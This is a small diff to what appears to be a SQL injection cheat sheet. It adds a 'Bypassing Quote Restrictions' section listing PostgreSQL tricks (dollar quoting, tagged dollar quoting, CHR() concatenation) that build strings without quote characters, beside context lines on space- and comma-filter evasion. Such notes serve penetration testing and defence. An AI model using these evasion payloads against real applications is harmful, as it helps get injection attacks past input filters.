@@ -73,3 +73,11 @@ SELECT 1,2,3,4 FROM TABLE;    UNION SELECT * from ((SELECT 1 FROM TABLE)a JOIN (
 SELECT/**/1;
 
 ```
+### Bypassing Quote Restrictions  
+```
+# postgres  
+SELECT 'TEST'; # example
+SELECT $$TEST$$;
+SELECT $TAG$TEST$TAG$;
+SELECT CHR(84) || CHR(69) || CHR (83)  || CHR (84);
+```
